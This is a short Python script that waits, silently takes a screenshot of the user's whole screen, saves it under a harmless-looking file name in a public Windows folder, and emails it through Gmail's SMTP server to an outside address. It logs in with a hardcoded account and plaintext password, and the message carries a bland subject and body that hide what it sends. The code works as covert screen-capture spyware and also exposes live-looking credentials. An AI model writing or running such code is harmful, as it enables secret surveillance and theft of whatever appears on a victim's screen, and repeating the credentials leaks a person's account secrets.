import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from PIL import ImageGrab
import time
import os

os.system('cmd')

time.sleep(16)

snapshot = ImageGrab.grab()
save_path = "C:\\Users\\Public\\Pictures\\haveniceday.jpg"
snapshot.save(save_path)

time.sleep(3)

email_user = 'rayensouchi@gmail.com'
email_password = 'format355'
email_send = 'rayenbenyoussef355@gmail.com'

subject = 'python'

msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Hi there, sending this email from Python!'
msg.attach(MIMEText(body,'plain'))

filename='C:\\Users\\Public\\Pictures\\haveniceday.jpg'
attachment  =open(filename,'rb')

part = MIMEBase('application','octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition',"attachment; filename= "+filename)

msg.attach(part)
text = msg.as_string()
server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(email_user, email_password)


server.sendmail(email_user,email_send,text)
server.quit()